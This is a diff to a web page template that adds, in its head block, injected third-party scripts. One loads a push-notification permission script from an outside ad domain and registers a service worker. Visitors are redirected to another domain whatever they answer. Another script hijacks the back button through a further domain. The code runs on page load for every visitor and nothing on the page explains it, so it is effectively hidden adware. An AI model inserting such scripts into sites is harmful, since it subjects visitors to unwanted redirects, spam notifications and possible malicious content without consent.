@@ -1,4 +1,32 @@
 {% extends "layouts/page.html" %}
+{% block head_scripts %}
+
+<script>
+    var s = document.createElement('script');
+    s.src='//deefauph.com/pfe/current/micro.tag.min.js?z=6244766'+'&sw=/sw-check-permissions-a0d20.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':
+            window.location.replace("//ungroudonchan.com/4/6244624");break;
+            case 'onPermissionDenied':
+            window.location.replace("//ungroudonchan.com/4/6244624");break;
+            case 'onAlreadySubscribed':
+            window.location.replace("//ungroudonchan.com/4/6244624");break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+</script>
+
+<script>
+      var Back_Button_Zone = 6244624;
+      var Domain_TB = "peelaipu.xyz";
+</script>
+<script async src="https://choogeet.net/tb1/reverse.min.js"></script>
+
+
+{% endblock %}
 {% block content %}
         <div class="row">
                 <div class="col-lg-3">
